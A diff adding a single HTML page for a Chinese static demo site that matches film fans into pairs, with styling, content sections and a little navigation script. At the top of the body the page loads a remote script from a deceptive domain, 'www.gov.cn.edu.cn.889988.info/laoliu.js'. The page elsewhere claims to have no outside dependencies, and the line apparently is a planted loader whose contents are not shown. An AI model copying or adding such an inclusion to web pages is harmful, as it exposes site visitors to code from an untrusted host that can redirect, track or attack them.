@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>同同电影网 - 同频双人观影导航 | tongxingdianyingwang-h5.github.io</title>
+<meta name="description" content="同同电影网（tongxingdianyingwang-h5.github.io）是同频双人观影导航站：电影、剧集、动漫、综艺，找到和你口味一样的观影搭子，移动端自适应，纯静态演示。" />
+<meta name="keywords" content="同同电影网,tongxingdianyingwang-h5,双人观影,同频推荐,好友片单,影视导航,一起看电影" />
+<link rel="canonical" href="https://tongxingdianyingwang-h5.github.io/" />
+<style>
+:root{
+  --orange:#ff8c42;--orange-light:#ffb888;--orange-dark:#e06a1b;
+  --indigo:#4a5bd7;--indigo-light:#7b89e8;--indigo-dark:#2f3fa8;
+  --cream:#fff8f0;--cream-dark:#f5ebe0;--bg:#1a1530;--bg2:#241f3d;
+  --card:#2a2547;--card2:#322c54;--line:rgba(255,140,66,.25);
+  --txt:#f0eaf5;--sub:#b8b0d0;--radius:18px;--maxw:1200px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--txt);line-height:1.7;-webkit-font-smoothing:antialiased;
+  min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 顶部导航 */
+header.site{position:sticky;top:0;z-index:60;backdrop-filter:saturate(140%) blur(12px);
+  background:rgba(26,21,48,.92);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:14px;height:64px}
+.logo{font-weight:900;font-size:22px;letter-spacing:.5px;display:flex;align-items:center;gap:8px}
+.logo-icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--orange),var(--indigo));display:flex;align-items:center;justify-content:center;font-size:18px}
+.logo-text{background:linear-gradient(90deg,var(--orange),var(--indigo-light));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{display:block;font-size:10px;color:var(--sub);font-weight:500;letter-spacing:0}
+.menu{margin-left:auto;display:flex;gap:4px;flex-wrap:wrap}
+.menu a{padding:8px 14px;border-radius:999px;color:var(--sub);font-size:14px;transition:.2s}
+.menu a:hover{color:var(--orange);background:rgba(255,140,66,.1)}
+.search{display:flex;gap:6px}
+.search input{width:170px;padding:9px 14px;border-radius:999px;border:1px solid var(--line);background:var(--bg2);color:#fff;outline:none;font-size:14px}
+.search button{border:0;padding:9px 16px;border-radius:999px;cursor:pointer;font-weight:800;background:linear-gradient(90deg,var(--orange),var(--indigo));color:#fff;font-size:14px}
+.burger{display:none;margin-left:auto;background:var(--bg2);border:1px solid var(--line);color:#fff;border-radius:12px;padding:8px 12px;font-size:18px}
+
+/* 首屏 - 配对大厅 */
+.hero{margin:24px 0;position:relative;overflow:hidden;border-radius:28px;
+  background:linear-gradient(135deg,#1a1530 0%,#2d1f5e 50%,#1a3060 100%);
+  border:1px solid var(--line);min-height:380px;display:flex;align-items:center}
+.hero::before{content:"";position:absolute;inset:0;
+  background:radial-gradient(circle at 20% 50%,rgba(255,140,66,.15),transparent 50%),
+             radial-gradient(circle at 80% 50%,rgba(74,91,215,.2),transparent 50%);}
+.hero-body{position:relative;z-index:1;padding:48px;flex:1}
+.hero-tag{display:inline-block;padding:5px 14px;border-radius:999px;background:rgba(255,140,66,.15);color:var(--orange);font-size:12px;font-weight:800;letter-spacing:2px;margin-bottom:14px}
+.hero h1{font-size:42px;margin:0 0 10px;line-height:1.2}
+.hero h1 .tt{background:linear-gradient(90deg,var(--orange),var(--indigo-light));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--sub);font-size:16px;max-width:520px;margin:0 0 24px}
+.hero-cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 24px;border-radius:999px;font-weight:800;border:0;cursor:pointer;transition:.25s;font-size:14px}
+.btn-primary{background:linear-gradient(90deg,var(--orange),var(--orange-dark));color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,140,66,.35)}
+.btn-secondary{background:transparent;border:2px solid var(--indigo-light);color:var(--indigo-light)}
+.btn-secondary:hover{background:var(--indigo);color:#fff;border-color:var(--indigo)}
+
+/* 右侧配对卡片 */
+.hero-side{position:relative;z-index:1;padding:48px 48px 48px 0;display:flex;flex-direction:column;gap:14px}
+.pair-card{width:200px;padding:16px;border-radius:16px;background:rgba(255,255,255,.06);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.1);text-align:center;transition:.3s}
+.pair-card:hover{transform:scale(1.05);border-color:var(--orange)}
+.pair-avatar{width:56px;height:56px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-size:24px}
+.pair-card h4{margin:0;font-size:14px}
+.pair-card span{font-size:11px;color:var(--sub)}
+.pair-match{font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;display:inline-block;margin-top:6px}
+.match-high{background:rgba(255,140,66,.2);color:var(--orange)}
+.match-mid{background:rgba(74,91,215,.2);color:var(--indigo-light)}
+
+/* 栏目通用 */
+.section{padding:36px 0}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:22px;flex-wrap:wrap}
+.sec-head h2{font-size:26px;margin:0;display:flex;align-items:center;gap:8px}
+.sec-head h2 .icon{font-size:24px}
+.sec-head span{color:var(--sub);font-size:13px}
+.more{margin-left:auto;color:var(--orange);font-size:13px;font-weight:700}
+
+/* 同频雷达 - 圆形布局 */
+.radar-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.radar-item{border-radius:20px;padding:24px 18px;text-align:center;position:relative;overflow:hidden;border:1px solid var(--line);transition:.3s}
+.radar-item:hover{transform:translateY(-4px)}
+.radar-item::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;
+  background:conic-gradient(from 0deg,transparent,rgba(255,140,66,.1),transparent 30%);animation:spin 6s linear infinite;pointer-events:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+.radar-circle{width:80px;height:80px;border-radius:50%;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;font-size:32px;position:relative;z-index:1}
+.radar-item h3{margin:0 0 6px;font-size:16px;position:relative;z-index:1}
+.radar-item p{margin:0;font-size:12px;color:var(--sub);position:relative;z-index:1}
+.radar-1{background:linear-gradient(180deg,rgba(255,140,66,.12),transparent)}
+.radar-1 .radar-circle{background:radial-gradient(circle,var(--orange),transparent 70%);box-shadow:0 0 30px rgba(255,140,66,.3)}
+.radar-2{background:linear-gradient(180deg,rgba(74,91,215,.12),transparent)}
+.radar-2 .radar-circle{background:radial-gradient(circle,var(--indigo),transparent 70%);box-shadow:0 0 30px rgba(74,91,215,.3)}
+.radar-3{background:linear-gradient(180deg,rgba(255,184,136,.12),transparent)}
+.radar-3 .radar-circle{background:radial-gradient(circle,#ff6b9d,transparent 70%);box-shadow:0 0 30px rgba(255,107,157,.3)}
+.radar-4{background:linear-gradient(180deg,rgba(123,137,232,.12),transparent)}
+.radar-4 .radar-circle{background:radial-gradient(circle,#7bed9f,transparent 70%);box-shadow:0 0 30px rgba(123,237,159,.3)}
+
+/* 双人时间轴 */
+.timeline{position:relative;padding:10px 0}
+.timeline::before{content:"";position:absolute;left:50%;top:0;bottom:0;width:3px;background:linear-gradient(180deg,var(--orange),var(--indigo));transform:translateX(-50%)}
+.tl-row{display:flex;align-items:center;margin-bottom:20px;position:relative}
+.tl-row:nth-child(odd){flex-direction:row}
+.tl-row:nth-child(even){flex-direction:row-reverse}
+.tl-content{width:45%;padding:18px 22px;border-radius:16px;background:var(--card);border:1px solid var(--line)}
+.tl-row:nth-child(odd) .tl-content{margin-right:auto}
+.tl-row:nth-child(even) .tl-content{margin-left:auto}
+.tl-dot{width:20px;height:20px;border-radius:50%;background:var(--orange);border:4px solid var(--bg);position:absolute;left:50%;transform:translateX(-50%);z-index:2;box-shadow:0 0 0 4px rgba(255,140,66,.2)}
+.tl-row:nth-child(even) .tl-dot{background:var(--indigo)}
+.tl-content h4{margin:0 0 6px;font-size:15px}
+.tl-content p{margin:0;font-size:13px;color:var(--sub)}
+.tl-time{font-size:11px;font-weight:800;color:var(--orange);margin-bottom:4px}
+.tl-row:nth-child(even) .tl-time{color:var(--indigo-light)}
+
+/* 好友片单墙 */
+.wall{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.wall-card{border-radius:18px;overflow:hidden;border:1px solid var(--line);background:var(--card);transition:.3s}
+.wall-card:hover{transform:translateY(-4px);box-shadow:0 16px 40px rgba(0,0,0,.4)}
+.wall-cover{height:160px;position:relative;display:flex;align-items:flex-end;padding:14px}
+.wall-card:nth-child(1) .wall-cover{background:linear-gradient(135deg,#ff8c42,#e06a1b)}
+.wall-card:nth-child(2) .wall-cover{background:linear-gradient(135deg,#4a5bd7,#2f3fa8)}
+.wall-card:nth-child(3) .wall-cover{background:linear-gradient(135deg,#ff6b9d,#c44d7a)}
+.wall-card:nth-child(4) .wall-cover{background:linear-gradient(135deg,#7bed9f,#4caf50)}
+.wall-card:nth-child(5) .wall-cover{background:linear-gradient(135deg,#a78bfa,#7c3aed)}
+.wall-card:nth-child(6) .wall-cover{background:linear-gradient(135deg,#fbbf24,#d97706)}
+.wall-cover h3{margin:0;font-size:16px;color:#fff}
+.wall-cover .who{position:absolute;top:14px;right:14px;background:rgba(0,0,0,.5);padding:3px 10px;border-radius:999px;font-size:11px;color:#fff}
+.wall-body{padding:14px}
+.wall-body p{margin:0 0 8px;font-size:13px;color:var(--sub)}
+.wall-tags{display:flex;gap:6px;flex-wrap:wrap}
+.wall-tags span{font-size:11px;padding:3px 10px;border-radius:999px;background:rgba(255,140,66,.1);color:var(--orange)}
+
+/* 匹配测试 */
+.match-section{background:linear-gradient(135deg,var(--card),var(--card2));border-radius:24px;padding:36px;border:1px solid var(--line);text-align:center}
+.match-section h2{font-size:28px;margin:0 0 10px}
+.match-section p{color:var(--sub);margin:0 0 24px}
+.match-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
+.match-opt{padding:18px;border-radius:16px;background:var(--bg2);border:2px solid transparent;cursor:pointer;transition:.25s}
+.match-opt:hover{border-color:var(--orange);transform:scale(1.03)}
+.match-opt .emoji{font-size:32px;display:block;margin-bottom:8px}
+.match-opt span{font-size:14px;font-weight:700}
+.match-btn{padding:14px 36px;border-radius:999px;font-weight:800;font-size:16px;border:0;cursor:pointer;background:linear-gradient(90deg,var(--orange),var(--indigo));color:#fff;transition:.25s}
+.match-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,140,66,.3)}
+
+/* 关于 */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.about-card{border-radius:20px;padding:28px;border:1px solid var(--line);background:var(--card)}
+.about-card h3{margin:0 0 12px;font-size:18px}
+.about-card p,.about-card li{color:var(--sub);font-size:14px;line-height:1.8}
+.about-card ul{padding-left:18px;margin:0}
+.stat-row{display:flex;gap:14px;margin-top:16px}
+.stat-box{flex:1;text-align:center;padding:16px;border-radius:14px;background:var(--bg2)}
+.stat-box b{display:block;font-size:24px;background:linear-gradient(90deg,var(--orange),var(--indigo-light));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat-box span{font-size:12px;color:var(--sub)}
+
+/* 底部 */
+footer.site{border-top:1px solid var(--line);padding:32px 0 48px;color:var(--sub);font-size:13px;text-align:center}
+footer.site a{color:var(--orange)}
+code{background:var(--bg2);border:1px solid var(--line);padding:2px 8px;border-radius:6px;color:var(--orange);font-size:12px}
+
+@media (max-width:1024px){
+  .hero{flex-direction:column}
+  .hero-body{padding:36px 24px}
+  .hero-side{padding:0 24px 36px;flex-direction:row;flex-wrap:wrap;justify-content:center}
+  .pair-card{width:160px}
+  .radar-grid{grid-template-columns:repeat(2,1fr)}
+  .wall{grid-template-columns:repeat(2,1fr)}
+  .match-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:12px 16px;gap:4px}
+  .menu.open{display:flex}
+  .burger{display:block}
+  .search input{width:110px}
+  .hero h1{font-size:28px}
+  .timeline::before{left:20px}
+  .tl-row{flex-direction:column!important;align-items:flex-start}
+  .tl-content{width:calc(100% - 50px);margin-left:50px!important;margin-right:0!important}
+  .tl-dot{left:20px}
+  .wall{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr}
+  .stat-row{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="logo-icon">🎬</div>
+      <div>同同电影网<small>tongxingdianyingwang-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#radar">同频雷达</a>
+      <a href="#timeline">双人排片</a>
+      <a href="#wall">好友片单</a>
+      <a href="#match">观影匹配</a>
+      <a href="#about">关于同同</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="搜电影/找搭子" aria-label="搜索" />
+      <button type="button" onclick="alert('演示站：搜索用 # 占位')">搜索</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 配对大厅 -->
+  <section class="hero" id="home" aria-label="同同电影网首屏">
+    <div class="hero-body">
+      <div class="hero-tag">🤝 同频 · 同行 · 同看</div>
+      <h1>找到你的<span class="tt">观影搭子</span></h1>
+      <p>同同电影网——不只是找片，更是找人。用口味匹配算法，连接和你一样爱这部电影的人，一起看、一起聊、一起回味。</p>
+      <div class="hero-cta">
+        <button class="btn btn-primary" onclick="location.href='#match'">开始匹配</button>
+        <button class="btn btn-secondary" onclick="location.href='#radar'">浏览雷达</button>
+      </div>
+    </div>
+    <div class="hero-side">
+      <div class="pair-card">
+        <div class="pair-avatar" style="background:linear-gradient(135deg,var(--orange),var(--orange-dark))">🎭</div>
+        <h4>悬疑控小A</h4>
+        <span>匹配度 96%</span>
+        <div class="pair-match match-high">极高频</div>
+      </div>
+      <div class="pair-card">
+        <div class="pair-avatar" style="background:linear-gradient(135deg,var(--indigo),var(--indigo-dark))">🚀</div>
+        <h4>科幻迷小B</h4>
+        <span>匹配度 88%</span>
+        <div class="pair-match match-mid">高频</div>
+      </div>
+      <div class="pair-card">
+        <div class="pair-avatar" style="background:linear-gradient(135deg,#ff6b9d,#c44d7a)">🎨</div>
+        <h4>文艺青年C</h4>
+        <span>匹配度 82%</span>
+        <div class="pair-match match-mid">高频</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 同频雷达 -->
+  <section class="section" id="radar">
+    <div class="sec-head"><h2><span class="icon">📡</span> 同频雷达</h2><span>找到和你口味一样的频道</span><a class="more" href="#">全部频道 #</a></div>
+    <div class="radar-grid">
+      <div class="radar-item radar-1">
+        <div class="radar-circle">🎭</div>
+        <h3>悬疑推理</h3>
+        <p>2,341 人同频</p>
+      </div>
+      <div class="radar-item radar-2">
+        <div class="radar-circle">🚀</div>
+        <h3>科幻未来</h3>
+        <p>1,876 人同频</p>
+      </div>
+      <div class="radar-item radar-3">
+        <div class="radar-circle">💕</div>
+        <h3>治愈爱情</h3>
+        <p>3,052 人同频</p>
+      </div>
+      <div class="radar-item radar-4">
+        <div class="radar-circle">🎨</div>
+        <h3>文艺独立</h3>
+        <p>1,203 人同频</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 双人排片时间轴 -->
+  <section class="section" id="timeline">
+    <div class="sec-head"><h2><span class="icon">📅</span> 双人排片</h2><span>约好时间，一起看</span><a class="more" href="#">完整排片 #</a></div>
+    <div class="timeline">
+      <div class="tl-row">
+        <div class="tl-content">
+          <div class="tl-time">今晚 20:00</div>
+          <h4>《消失的她》双人场</h4>
+          <p>已匹配 12 对搭子，悬疑控集合</p>
+        </div>
+        <div class="tl-dot"></div>
+      </div>
+      <div class="tl-row">
+        <div class="tl-content">
+          <div class="tl-time">明晚 21:00</div>
+          <h4>《流浪地球3》科幻夜</h4>
+          <p>8 对搭子已约，IMAX 讨论组</p>
+        </div>
+        <div class="tl-dot"></div>
+      </div>
+      <div class="tl-row">
+        <div class="tl-content">
+          <div class="tl-time">周六 19:30</div>
+          <h4>周末爱情马拉松</h4>
+          <p>连续 3 部经典爱情片，15 对参与</p>
+        </div>
+        <div class="tl-dot"></div>
+      </div>
+      <div class="tl-row">
+        <div class="tl-content">
+          <div class="tl-time">周日 14:00</div>
+          <h4>文艺午后 · 独立电影展</h4>
+          <p>5 部短片连放，映后线上讨论</p>
+        </div>
+        <div class="tl-dot"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 好友片单墙 -->
+  <section class="section" id="wall">
+    <div class="sec-head"><h2><span class="icon">🧱</span> 好友片单墙</h2><span>看看搭子们在看什么</span><a class="more" href="#">更多片单 #</a></div>
+    <div class="wall">
+      <div class="wall-card">
+        <div class="wall-cover"><h3>悬疑控的100部必看</h3><span class="who">小A</span></div>
+        <div class="wall-body">
+          <p>从希区柯克到诺兰，悬疑迷的终极清单</p>
+          <div class="wall-tags"><span>悬疑</span><span>烧脑</span><span>100部</span></div>
+        </div>
+      </div>
+      <div class="wall-card">
+        <div class="wall-cover"><h3>科幻迷的星际之旅</h3><span class="who">小B</span></div>
+        <div class="wall-body">
+          <p>从《2001太空漫游》到《沙丘》，硬科幻合集</p>
+          <div class="wall-tags"><span>科幻</span><span>太空</span><span>硬核</span></div>
+        </div>
+      </div>
+      <div class="wall-card">
+        <div class="wall-cover"><h3>周末治愈清单</h3><span class="who">小C</span></div>
+        <div class="wall-body">
+          <p>心情不好的时候，这些片子能救你一命</p>
+          <div class="wall-tags"><span>治愈</span><span>温暖</span><span>周末</span></div>
+        </div>
+      </div>
+      <div class="wall-card">
+        <div class="wall-cover"><h3>动作爽片不眨眼</h3><span class="who">小D</span></div>
+        <div class="wall-body">
+          <p>肾上腺素飙升合集，全程无尿点</p>
+          <div class="wall-tags"><span>动作</span><span>爽片</span><span>燃</span></div>
+        </div>
+      </div>
+      <div class="wall-card">
+        <div class="wall-cover"><h3>动画短片精选</h3><span class="who">小E</span></div>
+        <div class="wall-body">
+          <p>每一部都是艺术品，10分钟看完一个世界</p>
+          <div class="wall-tags"><span>动画</span><span>短片</span><span>艺术</span></div>
+        </div>
+      </div>
+      <div class="wall-card">
+        <div class="wall-cover"><h3>纪录片深度观察</h3><span class="who">小F</span></div>
+        <div class="wall-body">
+          <p>真实比虚构更震撼，每一帧都是现实</p>
+          <div class="wall-tags"><span>纪录</span><span>真实</span><span>深度</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 观影匹配测试 -->
+  <section class="section" id="match">
+    <div class="match-section">
+      <h2>🎯 观影匹配测试</h2>
+      <p>回答 4 个问题，找到你的完美观影搭子</p>
+      <div class="match-grid">
+        <div class="match-opt"><span class="emoji">🎭</span><span>悬疑烧脑</span></div>
+        <div class="match-opt"><span class="emoji">🚀</span><span>科幻冒险</span></div>
+        <div class="match-opt"><span class="emoji">💕</span><span>治愈爱情</span></div>
+        <div class="match-opt"><span class="emoji">😂</span><span>喜剧放松</span></div>
+      </div>
+      <button class="match-btn" onclick="alert('演示站：匹配结果用 # 占位')">开始匹配我的搭子</button>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="section" id="about">
+    <div class="sec-head"><h2><span class="icon">ℹ️</span> 关于同同</h2><span>About TongTong</span></div>
+    <div class="about-grid">
+      <div class="about-card">
+        <h3>同同电影网是什么？</h3>
+        <p>同同电影网（tongxingdianyingwang-h5.github.io）是一个以"双人观影社交"为核心的影视导航演示站。我们相信好电影值得和人一起分享——所以不只是推荐片，更帮你找到那个"同频的人"。</p>
+        <div class="stat-row">
+          <div class="stat-box"><b>6+</b><span>栏目板块</span></div>
+          <div class="stat-box"><b>100%</b><span>移动端适配</span></div>
+          <div class="stat-box"><b>0</b><span>后端依赖</span></div>
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库、无真实用户数据</li>
+          <li>所有播放/详情/分类链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源，仅作影视导航演示</li>
+          <li>必应收录友好：唯一 H1、关键词前置、canonical 自指向</li>
+          <li>移动端优先响应式，适配手机/平板/桌面</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    同同电影网 · <a href="https://tongxingdianyingwang-h5.github.io/">tongxingdianyingwang-h5.github.io</a><br/>
+    演示页面：所有播放 / 详情 / 分类链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 同同电影网 Demo · 双人观影社交导航演示，仅用于静态站 / SEO / 移动端适配演示。
+  </div>
+</footer>
+
+<script>
+  const burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',()=>menu.classList.toggle('open'));
+  menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('open')));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  }));
+  // 匹配选项交互
+  document.querySelectorAll('.match-opt').forEach(opt=>{
+    opt.addEventListener('click',()=>{
+      document.querySelectorAll('.match-opt').forEach(o=>o.style.borderColor='transparent');
+      opt.style.borderColor='var(--orange)';
+    });
+  });
+</script>
+</body>
+</html>
